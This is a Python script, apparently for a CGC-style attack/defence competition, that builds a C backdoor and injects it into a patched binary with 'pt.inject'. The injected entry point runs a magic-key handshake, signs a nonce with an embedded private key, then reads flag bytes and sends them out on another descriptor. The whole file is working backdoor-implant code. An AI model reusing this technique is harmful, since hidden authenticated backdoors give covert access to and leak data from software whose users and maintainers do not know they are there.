import os

from util import read

def create(pt):
    c = read('backdoor/tweetnacl.c')
    c = c.replace('#include "tweetnacl.h"', '')
    h = read('backdoor/tweetnacl.h')
    privkey = read('backdoor/privkey.h')
    randombytes = r'''
    void randombytes(uint8_t *msg, uint64_t len) {
        random(msg, (uint32_t)len, 0);
    }
    '''

    code = r'''
    void _start() {
        uint32_t negotiate = 2;
        transmit(3, &negotiate, 4, 0);
        for (int i = 0; i < 3; i++) {
            receive(3, &negotiate, 4, 0);
        }

        // generate handshake key
        char key[9] = {'E', 'C', 'A', 'F'};
        // random length from 5-8
        uint8_t b = 0;
        random(&b, 1, 0);
        int length = 5 + (b % 4);

        for (int i = 4; i < length; i++) {
            uint8_t b = 0;
            while (!b) random(&b, 1, 0);
            key[i] = b;
            for (int j = 0; j < 4; j++) {
                key[j] ^= b;
            }
        }
        transmit(1, key, length, 0);

        // wait for key response
        for (int i = 0; i < length; i++) {
            key[i] ^= 0xff;
        }
        char ring[8] = {0};
        int p = 0;
        while (1) {
            uint32_t count = 0;
            if (receive(0, ring + p, 1, &count) || count == 0) _terminate(1);
            int match = 0;
            for (int i = 0; i < length; i++) {
                int off = (p - length + i + 1) % 8;
                if (off < 0) off += 8;
                if (ring[off] != key[i]) break;
                match++;
            }
            if (match == length) break;

            p = (p + 1) % 8;
        }

        uint8_t nonce[8];
        if (receive(0, nonce, 8, 0)) _terminate(1);

        uint8_t *sm;
        uint64_t smlen = 8 + crypto_sign_BYTES;
        if (allocate(smlen, 0, &sm)) _terminate(1);
        crypto_sign(sm, &smlen, nonce, 8, privkey);

        size_t size = smlen;
        transmit(1, &size, 4, 0);
        transmit(1, sm, size, 0);

        char flag[4];
        receive(0, flag, 4, 0);
        transmit(3, flag, 4, 0);

        _terminate(0);
    }
    '''

    code = h + privkey + code + randombytes + c
    pt.entry = pt.inject(c=code)
